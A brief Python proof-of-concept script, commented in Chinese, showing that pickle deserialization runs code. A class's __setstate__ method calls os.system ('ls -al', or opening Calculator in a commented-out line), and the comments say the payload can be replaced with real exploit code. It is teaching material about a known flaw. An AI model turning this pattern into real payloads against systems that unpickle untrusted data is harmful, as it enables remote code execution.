#!/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'MFC'
__time__ = '2020/6/28 16:23'

"""
ref:
https://zhuanlan.zhihu.com/p/148696337
python中的反序列化安全问题

python并没有对pickle模块做任何安全性的限制：他没有验证反序列化的类是否在应用中注册，也没有类似Java中SerializeUID的存在。
这也就导致了，攻击者任意构造的对象都会被实现了pickle.load的接口进行反序列化并执行Magic function。

POC
"""

import pickle
import os

class SerializePerson:
    def __init__(self, name):
        self.name = name

    # 构造 __setstate__ 方法
    def __setstate__(self, name):
        # os.system('open /Applications/Calculator.app/')  # 恶意代码, 这里是POC代码，可以换成EXP代码
        ret = os.system('ls -al')  # 恶意代码, 这里是POC代码，可以换成EXP代码
        return ret

tmp = pickle.dumps(SerializePerson('tom'))  # 序列化
pickle.loads(tmp)  # 反序列化 此时会弹出计算器